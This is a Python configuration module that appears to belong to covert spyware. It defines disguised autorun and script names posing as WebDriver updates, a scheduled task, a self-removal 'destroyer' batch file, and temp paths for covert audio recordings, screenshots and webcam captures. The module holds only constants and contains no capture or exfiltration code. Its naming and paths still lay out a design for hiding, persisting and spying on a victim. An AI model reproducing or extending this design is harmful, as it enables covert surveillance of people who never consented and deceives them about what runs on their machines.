import os
import tempfile
import subprocess


BASE_DIR = os.path.dirname(os.path.realpath(__file__))
PC_TEMP_DIR = tempfile.gettempdir()
PROJECT_TEMP_DIR = os.path.join(BASE_DIR, "temp")

# first from venv
PYTHON_INTERPRETER_PATH = (subprocess.check_output("where python", shell=True).decode()).split()[-1]

MAIN_FILENAME = "main.py"
DESTROYER_FILENAME = "destroyer.bat"
AUTORUN_NAME = "WebDrive"
BAT_FILENAME = "WebDriver.bat"
RUN_FILENAME = "WebDriverUpdates.vbs"
TASK_NAME = "WebDriverRemoving"

RECORD_PATH = os.path.join(PC_TEMP_DIR, "sound.wav")
SCREENSHOT_PATH = os.path.join(PC_TEMP_DIR, "screenshot")
WEBCAM_SCREEN_PATH = os.path.join(PC_TEMP_DIR, "webcam.jpg")
